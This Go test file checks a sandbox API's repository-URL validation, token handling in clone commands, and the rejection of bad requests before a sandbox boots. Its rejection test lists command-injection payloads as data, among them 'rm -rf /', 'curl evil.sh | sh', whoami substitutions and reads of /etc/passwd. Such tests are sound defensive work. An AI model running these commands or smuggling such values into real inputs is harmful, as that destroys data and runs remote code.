package httpapi

import (
	"net/http"
	"strings"
	"testing"
)

// The repo URL reaches a shell inside the sandbox.
func TestValidRepoURLRejectsInjection(t *testing.T) {
	bad := []string{
		"https://github.com/o/r.git; rm -rf /",
		"https://github.com/o/r.git && curl evil.sh | sh",
		"https://github.com/o/r.git | tee /etc/passwd",
		"https://github.com/o/r$(whoami).git",
		"https://github.com/o/r`id`.git",
		"https://github.com/o/r.git\nrm -rf /",
		"https://github.com/o/r.git 'x'",
		`https://github.com/o/r.git "x"`,
		"https://github.com/../../etc/passwd",
		"file:///etc/passwd",
		"git://github.com/o/r.git",
		"ext::sh -c whoami",
		"-u expr",
		"",
		strings.Repeat("https://github.com/o/", 40) + "r",
	}
	for _, u := range bad {
		if validRepoURL(u) {
			t.Errorf("accepted dangerous repo URL: %q", u)
		}
	}
}

func TestValidRepoURLAcceptsRealForms(t *testing.T) {
	good := []string{
		"https://github.com/owner/repo.git",
		"https://github.com/owner/repo",
		"https://gitlab.example.com:8443/group/sub/repo.git",
		"git@github.com:owner/repo.git",
		"ssh://git@github.com/owner/repo.git",
	}
	for _, u := range good {
		if !validRepoURL(u) {
			t.Errorf("rejected a legitimate repo URL: %q", u)
		}
	}
}

func TestRepoDirName(t *testing.T) {
	for in, want := range map[string]string{
		"https://github.com/owner/repo.git":   "repo",
		"https://github.com/owner/repo":       "repo",
		"git@github.com:owner/my-app.git":     "my-app",
		"ssh://git@host/group/sub/thing.git":  "thing",
		"https://github.com/owner/-weird.git": "repo", // never a git flag
		"https://github.com/owner/.git":       "repo", // never empty/hidden
	} {
		if got := repoDirName(in); got != want {
			t.Errorf("repoDirName(%q) = %q, want %q", in, got, want)
		}
	}
}

// The token stays a shell variable expanded inside the VM so it never reaches logs or the audit record.
func TestBuildCloneCmdKeepsTokenAsShellVar(t *testing.T) {
	cmd, dir := buildCloneCmd("https://github.com/owner/repo.git", "", true)
	if dir != "repo" {
		t.Fatalf("dir = %q, want repo", dir)
	}
	if !strings.Contains(cmd, "${GIT_TOKEN}") {
		t.Errorf("token not referenced as a shell variable: %q", cmd)
	}
	if !strings.Contains(cmd, "x-access-token:${GIT_TOKEN}@github.com/owner/repo.git") {
		t.Errorf("auth URL not built: %q", cmd)
	}
	if !strings.Contains(cmd, " -- ") {
		t.Errorf("missing -- guard, a URL starting with - would parse as a flag: %q", cmd)
	}

	plain, _ := buildCloneCmd("https://github.com/owner/repo.git", "main", false)
	if strings.Contains(plain, "GIT_TOKEN") {
		t.Errorf("token machinery leaked into a public clone: %q", plain)
	}
	if !strings.Contains(plain, "--branch main") {
		t.Errorf("ref not honoured: %q", plain)
	}
	// SSH URLs have no token form.
	ssh, _ := buildCloneCmd("git@github.com:owner/repo.git", "", true)
	if strings.Contains(ssh, "GIT_TOKEN") {
		t.Errorf("ssh URL rewritten with a token: %q", ssh)
	}
}

func TestEnvHasKey(t *testing.T) {
	env := []string{"FOO=1", "GIT_TOKEN=secret", "BAR=2"}
	if !envHasKey(env, "GIT_TOKEN") {
		t.Error("GIT_TOKEN not detected")
	}
	if envHasKey(env, "GIT") {
		t.Error("prefix match must not count as a key")
	}
	if envHasKey(nil, "GIT_TOKEN") {
		t.Error("nil env matched")
	}
}

func TestCreateRejectsBadRepoBeforeBooting(t *testing.T) {
	srv, _, key := newTestServerWithStore(t)

	code, out := do(t, "POST", srv.URL+"/v1/sandboxes", key,
		`{"template":"base","repo":"https://github.com/o/r.git; rm -rf /"}`)
	if code != http.StatusBadRequest {
		t.Fatalf("create with injection payload = %d (%v), want 400", code, out)
	}

	code, out = do(t, "GET", srv.URL+"/v1/sandboxes", key, "")
	if code != http.StatusOK {
		t.Fatalf("list = %d", code)
	}
	if n := sandboxCount(out); n != 0 {
		t.Errorf("%d sandboxes booted for a rejected request, want 0", n)
	}
}

// The clone must be the first setup step. The host is unroutable on purpose;
// the wiring is under test, not git.
func TestCreateAttachesRepo(t *testing.T) {
	srv, _, key := newTestServerWithStore(t)

	code, out := do(t, "POST", srv.URL+"/v1/sandboxes", key,
		`{"template":"base","repo":"https://127.0.0.1:1/owner/my-app.git","setup":["echo after"]}`)
	if code != http.StatusCreated {
		t.Fatalf("create = %d (%v)", code, out)
	}
	if got, _ := out["repo_dir"].(string); got != "my-app" {
		t.Errorf("repo_dir = %q, want my-app", got)
	}
	log, _ := out["deploy_log"].([]any)
	if len(log) == 0 {
		t.Fatal("no deploy_log")
	}
	first, _ := log[0].(string)
	if !strings.Contains(first, "git clone") {
		t.Errorf("first deploy step = %q, want the clone to run before the caller's setup", first)
	}
	if !strings.Contains(first, "my-app") {
		t.Errorf("clone step does not target the derived directory: %q", first)
	}
}
